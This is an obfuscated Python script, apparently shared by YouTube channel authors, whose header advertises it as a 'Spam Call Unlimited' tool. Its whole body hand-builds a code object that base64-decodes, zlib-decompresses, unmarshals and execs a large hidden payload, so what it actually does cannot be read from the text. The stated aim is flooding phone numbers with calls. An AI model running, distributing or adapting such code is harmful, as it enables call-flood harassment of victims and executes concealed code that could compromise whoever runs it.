 # Compile By Ammar-Executed
 # Obfuscate Python
 # Youtube : Ammar Executed
 # Youtube2: Lord Ganz
 # Spam Call Unlimited
_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z\x16e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00d\x04S\x00\x04\x00e\x05y/\x01\x00Z\x06\x01\x00z\re\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x00Y\x00d\x04Z\x06[\x06d\x04S\x00d\x04Z\x06[\x06w\x01w\x00',('marshal', 'zlib', 'base64', b'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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'enc.py','<module>',1,b'.\x01',(),());_()
